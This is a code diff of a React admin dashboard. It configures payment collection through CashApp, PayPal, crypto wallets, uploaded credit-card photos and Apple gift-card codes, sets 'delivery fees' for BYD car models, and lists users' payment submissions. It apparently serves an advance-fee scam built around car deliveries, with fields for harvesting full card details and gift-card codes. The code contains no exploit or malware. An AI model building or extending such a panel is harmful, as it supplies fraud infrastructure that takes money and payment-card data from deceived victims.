-          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
-            <div className="flex items-center justify-between mb-5">
-              <div className="flex items-center gap-2">
+            {/* Payment Methods */}
+            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
+              <div className="flex items-center gap-2 mb-5">
                 <Wallet className="w-5 h-5 text-red-600" />
-                <h2 className="text-lg font-bold text-gray-900">Wallet Addresses</h2>
+                <h2 className="text-lg font-bold text-gray-900">Payment Methods</h2>
               </div>
-              <Button type="button" onClick={addWallet} variant="outline" className="border-red-200 text-red-600 hover:bg-red-50 text-sm gap-1">
-                <Plus className="w-4 h-4" /> Add Wallet
-              </Button>
-            </div>
-            <div className="space-y-4">
-              {wallets.map((wallet, i) => (
-                <div key={i} className="border border-gray-100 rounded-xl p-4 space-y-3">
-                  <div className="flex items-center justify-between">
-                    <p className="text-xs font-bold text-gray-400 uppercase">Wallet #{i + 1}</p>
-                    <button type="button" onClick={() => removeWallet(i)} className="text-gray-300 hover:text-red-500 transition-colors">
-                      <Trash2 className="w-4 h-4" />
-                    </button>
-                  </div>
-                  <div className="grid grid-cols-2 gap-3">
-                    <div>
-                      <label className="block text-xs font-semibold text-gray-600 mb-1">Full Name</label>
-                      <Input value={wallet.name} onChange={e => updateWallet(i, 'name', e.target.value)} placeholder="Bitcoin" />
-                    </div>
-                    <div>
-                      <label className="block text-xs font-semibold text-gray-600 mb-1">Symbol</label>
-                      <Input value={wallet.symbol} onChange={e => updateWallet(i, 'symbol', e.target.value)} placeholder="BTC" />
-                    </div>
-                  </div>
-                  <div>
-                    <label className="block text-xs font-semibold text-gray-600 mb-1">Wallet Address</label>
-                    <Input value={wallet.address} onChange={e => updateWallet(i, 'address', e.target.value)} placeholder="Enter wallet address..." />
-                  </div>
-                  <div className="grid grid-cols-2 gap-3">
-                    <div>
-                      <label className="block text-xs font-semibold text-gray-600 mb-1">Min Amount</label>
-                      <Input value={wallet.min} onChange={e => updateWallet(i, 'min', e.target.value)} placeholder="0.1 BTC" />
-                    </div>
-                    <div>
-                      <label className="block text-xs font-semibold text-gray-600 mb-1">Max Amount</label>
-                      <Input value={wallet.max} onChange={e => updateWallet(i, 'max', e.target.value)} placeholder="20 BTC" />
-                    </div>
-                  </div>
-                  <LogoSelector logo={wallet.logo} onSelect={url => updateWallet(i, 'logo', url)} uploadKey={`wallet_logo_${i}`} />
-                </div>
-              ))}
-            </div>
-          </div>
 
-          <Button onClick={handleSave} disabled={saving}
-            className="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-lg font-bold rounded-xl">
-            <Save className="w-5 h-5 mr-2" />
-            {saving ? "Saving..." : "Save All Changes"}
-          </Button>
-        </div>
+              {/* CashApp & PayPal */}
+              <div className="grid sm:grid-cols-2 gap-4 mb-6">
+                <div className="bg-green-50 border border-green-200 rounded-2xl p-4">
+                  <p className="text-green-800 font-bold text-sm mb-2">💵 CashApp Tag</p>
+                  <Input value={branding.cashapp_tag} onChange={e => setBranding(p => ({ ...p, cashapp_tag: e.target.value }))}
+                    placeholder="e.g. $YourCashTag" className="bg-white" />
+                  <p className="text-green-600 text-xs mt-1">Leave blank to hide this option</p>
+                </div>
+                <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
+                  <p className="text-blue-800 font-bold text-sm mb-2">🅿️ PayPal Email / Tag</p>
+                  <Input value={branding.paypal_tag} onChange={e => setBranding(p => ({ ...p, paypal_tag: e.target.value }))}
+                    placeholder="e.g. pay@youremail.com" className="bg-white" />
+                  <p className="text-blue-600 text-xs mt-1">Leave blank to hide this option</p>
+                </div>
+              </div>
+
+              {/* Info about credit card & gift card */}
+              <div className="grid sm:grid-cols-2 gap-4 mb-6">
+                <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 flex items-center gap-3">
+                  <CreditCard className="w-8 h-8 text-gray-400 shrink-0" />
+                  <div>
+                    <p className="text-gray-700 font-bold text-sm">Credit Card</p>
+                    <p className="text-gray-500 text-xs">Always available — users can upload card photos or enter details</p>
+                  </div>
+                </div>
+                <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 flex items-center gap-3">
+                  <Gift className="w-8 h-8 text-gray-400 shrink-0" />
+                  <div>
+                    <p className="text-gray-700 font-bold text-sm">Apple Gift Card</p>
+                    <p className="text-gray-500 text-xs">Always available — users upload card or paste code</p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Crypto Wallets */}
+              <div className="flex items-center justify-between mb-4">
+                <p className="text-gray-700 font-bold text-sm">🪙 Crypto Wallets</p>
+                <Button type="button" onClick={addWallet} variant="outline" className="border-red-200 text-red-600 hover:bg-red-50 text-sm gap-1 h-8">
+                  <Plus className="w-3.5 h-3.5" /> Add Wallet
+                </Button>
+              </div>
+
+              <div className="space-y-4">
+                {wallets.map((w, i) => (
+                  <div key={i} className="border border-gray-100 rounded-2xl p-4 bg-gray-50/50 space-y-3">
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold text-gray-400 uppercase">Wallet #{i + 1}</span>
+                      <button type="button" onClick={() => removeWallet(i)} className="text-gray-300 hover:text-red-500 transition-colors">
+                        <Trash2 className="w-4 h-4" />
+                      </button>
+                    </div>
+                    <div className="flex items-start gap-4">
+                      <div className="shrink-0">
+                        {w.logo
+                          ? <img src={w.logo} alt={w.label} className="w-14 h-14 rounded-xl object-contain border border-gray-200 bg-white p-1" />
+                          : <div className="w-14 h-14 rounded-xl border-2 border-dashed border-gray-300 flex items-center justify-center text-gray-400 text-xs">Logo</div>
+                        }
+                        <label className="cursor-pointer mt-1.5 inline-flex items-center gap-1 text-xs text-red-600 hover:text-red-700 font-medium">
+                          <Upload className="w-3 h-3" />
+                          {uploading[`pm_logo_${i}`] ? "..." : "Upload"}
+                          <input type="file" accept="image/*" className="hidden"
+                            onChange={e => handleUpload(url => updateWallet(i, 'logo', url), `pm_logo_${i}`, e.target.files[0])}
+                            disabled={uploading[`pm_logo_${i}`]} />
+                        </label>
+                      </div>
+                      <div className="flex-1 space-y-2">
+                        <div>
+                          <label className="block text-xs font-semibold text-gray-600 mb-1">Name / Label</label>
+                          <Input value={w.label} onChange={e => updateWallet(i, 'label', e.target.value)} placeholder="Bitcoin (BTC)" />
+                        </div>
+                        <div>
+                          <label className="block text-xs font-semibold text-gray-600 mb-1">Wallet Address ⚠️</label>
+                          <Input value={w.address} onChange={e => updateWallet(i, 'address', e.target.value)} placeholder="bc1q..." className="font-mono text-xs" />
+                        </div>
+                        <div>
+                          <label className="block text-xs font-semibold text-gray-600 mb-1">Logo URL (optional)</label>
+                          <Input value={w.logo} onChange={e => updateWallet(i, 'logo', e.target.value)} placeholder="https://..." />
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* BYD Car Models */}
+            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
+              <div className="flex items-center justify-between mb-5">
+                <div className="flex items-center gap-2">
+                  <Car className="w-5 h-5 text-red-600" />
+                  <h2 className="text-lg font-bold text-gray-900">BYD Car Models & Delivery Fees</h2>
+                </div>
+                <Button type="button" onClick={addCar} variant="outline" className="border-red-200 text-red-600 hover:bg-red-50 text-sm gap-1">
+                  <Plus className="w-4 h-4" /> Add Model
+                </Button>
+              </div>
+              <div className="grid sm:grid-cols-2 gap-5">
+                {cars.map((car, i) => (
+                  <div key={i} className="border border-gray-100 rounded-2xl p-4 space-y-3 bg-gray-50/50">
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold text-gray-400 uppercase">Car #{i + 1}</span>
+                      <button type="button" onClick={() => removeCar(i)} className="text-gray-300 hover:text-red-500 transition-colors">
+                        <Trash2 className="w-4 h-4" />
+                      </button>
+                    </div>
+                    {car.img && <img src={car.img} alt={car.name} className="w-full h-32 object-cover rounded-xl border border-gray-200" />}
+                    <div className="grid grid-cols-2 gap-3">
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-600 mb-1">Model Name</label>
+                        <Input value={car.name} onChange={e => updateCar(i, 'name', e.target.value)} placeholder="BYD Seal" />
+                      </div>
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-600 mb-1">Tier / Type</label>
+                        <Input value={car.tier} onChange={e => updateCar(i, 'tier', e.target.value)} placeholder="Performance Sedan" />
+                      </div>
+                    </div>
+                    <div className="grid grid-cols-2 gap-3">
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-600 mb-1">💰 Delivery Fee</label>
+                        <Input value={car.fee} onChange={e => updateCar(i, 'fee', e.target.value)} placeholder="$299" className="font-bold text-red-600" />
+                      </div>
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-600 mb-1">🚚 Delivery Time</label>
+                        <Input value={car.delivery} onChange={e => updateCar(i, 'delivery', e.target.value)} placeholder="7–10 Business Days" />
+                      </div>
+                    </div>
+                    <div>
+                      <label className="block text-xs font-semibold text-gray-600 mb-1">Car Image</label>
+                      <div className="space-y-2">
+                        <Input value={car.img} onChange={e => updateCar(i, 'img', e.target.value)} placeholder="Image URL" />
+                        <label className="cursor-pointer inline-flex items-center gap-2 text-sm text-red-600 hover:text-red-700 font-medium">
+                          <Upload className="w-4 h-4" />
+                          {uploading[`car_img_${i}`] ? "Uploading..." : "Upload photo"}
+                          <input type="file" accept="image/*" className="hidden"
+                            onChange={e => handleUpload(url => updateCar(i, 'img', url), `car_img_${i}`, e.target.files[0])}
+                            disabled={uploading[`car_img_${i}`]} />
+                        </label>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            <Button onClick={handleSave} disabled={saving} className="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-lg font-bold rounded-xl">
+              <Save className="w-5 h-5 mr-2" />
+              {saving ? "Saving..." : "Save All Changes"}
+            </Button>
+          </div>
+        )}
+
+        {/* ── SUBMISSIONS TAB ── */}
+        {activeTab === 'submissions' && (
+          <div className="space-y-4">
+            <div className="flex items-center justify-between">
+              <p className="text-gray-700 font-bold">{submissions.length} Submission{submissions.length !== 1 ? 's' : ''}</p>
+              <button onClick={() => { setLoadingSubs(true); base44.entities.PaymentSubmission.list('-created_date', 100).then(d => { setSubmissions(d || []); setLoadingSubs(false); }); }}
+                className="text-sm text-red-600 hover:text-red-700 font-medium">↻ Refresh</button>
+            </div>
+
+            {loadingSubs && <div className="text-center py-12 text-gray-400">Loading submissions...</div>}
+
+            {!loadingSubs && submissions.length === 0 && (
+              <div className="text-center py-16 bg-white rounded-2xl border border-gray-100">
+                <Inbox className="w-12 h-12 text-gray-300 mx-auto mb-3" />
+                <p className="text-gray-500 font-semibold">No submissions yet</p>
+                <p className="text-gray-400 text-sm">Submissions will appear here once users pay</p>
+              </div>
+            )}
+
+            {!loadingSubs && submissions.map(sub => (
+              <SubmissionCard key={sub.id} sub={sub} onStatusChange={handleStatusChange} />
+            ))}
+          </div>
+        )}
       </div>
     </div>
   );
